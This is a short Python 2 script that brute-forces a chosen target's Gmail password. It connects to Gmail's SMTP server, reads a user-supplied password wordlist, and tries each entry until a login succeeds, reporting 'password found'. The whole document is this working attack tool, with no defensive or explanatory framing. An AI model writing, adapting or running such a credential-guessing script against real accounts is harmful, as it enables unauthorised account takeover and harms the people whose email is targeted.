import smtplib
 
smtpserver = smtplib.SMTP("smtp.gmail.com",  587)
smtpserver.ehlo()
smtpserver.starttls()
 
user = raw_input("give me yout target email ==> ")
passwfile = raw_input("give me the path of your file ==> ")
 
passwfile = open(passwfile , "r")
 
for password in passwfile:
        try:
            smtpserver.login(user, password)
            print "[+] - password found : %s" % password
            break;
 
        except smtplib.SMTPAuthenticationError:
            print "[!] password incorrect : %s " % password
